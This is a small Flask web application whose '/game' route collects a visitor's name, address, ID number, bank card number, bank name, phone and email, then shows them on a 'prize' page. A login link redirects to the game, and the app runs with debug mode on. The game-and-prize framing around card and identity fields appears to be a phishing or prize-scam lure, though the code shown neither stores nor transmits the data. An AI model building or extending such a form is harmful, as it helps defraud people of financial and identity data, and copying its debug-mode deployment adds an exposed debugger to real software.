from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/game', methods=['GET', 'POST'])
def game():
    if request.method == 'POST':
        name = request.form.get('name')
        address = request.form.get('address')
        id_number = request.form.get('id_number')
        card_number = request.form.get('card_number')
        bank_name = request.form.get('bank_name')
        phone = request.form.get('phone')
        email = request.form.get('email')
        return render_template(
            'prize.html',
            name=name,
            address=address,
            id_number=id_number,
            card_number=card_number,
            bank_name=bank_name,
            phone=phone,
            email=email
        )
    return render_template('game.html')

@app.route('/login')
def login():
    return redirect(url_for('game'))

if __name__ == '__main__':
    app.run(debug=True)
